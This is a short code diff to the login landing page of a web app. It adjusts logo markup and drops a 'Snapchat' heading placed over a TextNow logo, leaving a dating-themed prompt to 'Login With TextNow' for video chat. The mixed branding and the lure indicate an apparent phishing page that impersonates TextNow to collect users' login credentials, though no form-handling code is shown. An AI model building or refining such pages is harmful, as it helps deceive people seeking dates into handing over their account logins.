@@ -27,14 +27,12 @@ export default function Home() {
             <div class="p-5 w-[400px]">
               <div class="mx-auto flex items-center justify-center mt-5">
                 <img
-                  class="h-28 w-36 text-center"
+                  class="h-28  text-center"
                   src="/images/textnow-logo.png"
                   alt=""
                 />
               </div>
-              <h2 class="text-3xl font-bold text-blue-900 text-center">
-                Snapchat
-              </h2>
+
               <p class="text-xl pt-5 font-semibold text-[#707b8e]">
                 Login With TextNow and enjoy with{" "}
                 <b class="text-blue-500">TextNow video chat</b> your dating
@@ -46,11 +44,7 @@ export default function Home() {
                 onClick={() => setShowForm(false)}
               >
                 <span>
-                  <img
-                    src="/images/textnow-logo.png"
-                    class="w-12 h-12"
-                    alt=""
-                  />
+                  <img src="/images/logo.png" class="w-12 h-12" alt="" />
                 </span>
                 <span>Login With TextNow</span>
               </button>
